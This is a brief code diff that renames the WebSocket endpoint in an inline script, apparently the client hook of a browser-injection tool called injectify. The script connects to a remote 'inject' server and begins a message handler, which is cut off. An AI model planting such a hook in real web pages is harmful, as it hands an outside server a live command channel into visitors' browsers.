@@ -1,7 +1,7 @@
 <script>
 (function i() {
-    let url = 'ws://127.0.0.1:3000/inject/websocket/'
-    if (window.location.host === 'injectify.samdd.me') url = 'wss://injectify.samdd.me/inject/websocket/'
+    let url = 'ws://127.0.0.1:3000/i/websocket'
+    if (window.location.host === 'injectify.samdd.me') url = 'wss://injectify.samdd.me/i/websocket'
     window.ws = new WebSocket(url + '?$' + btoa('private'))
     ws.onmessage = function(d) {
         try {
